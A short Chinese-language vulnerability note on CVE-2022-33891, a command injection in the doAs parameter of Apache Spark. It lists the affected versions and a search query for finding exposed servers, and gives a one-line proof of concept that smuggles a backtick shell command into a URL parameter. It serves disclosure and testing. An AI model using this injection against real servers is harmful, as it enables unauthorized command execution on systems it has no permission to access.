# Apache Spark doAs 远程命令执行漏洞 CVE-2022-33891

## 漏洞描述

Apache Spark 支持启动 ACL 来为 Web UI 访问提供身份验证，当 ACL 启动时可以通过构造特殊请求用户名导致 RCE 

## 漏洞影响

<a-checkbox checked>Spark Core - Apache <=3.0.3</a-checkbox></br>

<a-checkbox checked>3.1.1 <= Spark Core - Apache <=3.1.2</a-checkbox></br>

<a-checkbox checked>3.2.0 <= Spark Core - Apache <=3.2.1</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="APACHE-Spark"</a-checkbox></br>

## 漏洞复现

主页面

![img](/assets/PeiQi-Wiki/img/1662174736577-4e5a3852-3359-43a2-8470-228e306f34e5.png)

验证POC

```html
/jobs/?doAs=`touch /tmp/test.txt`
```

![img](/assets/PeiQi-Wiki/img/1662174983427-249a9ba2-f516-45dc-b08e-206c2830ff81.png)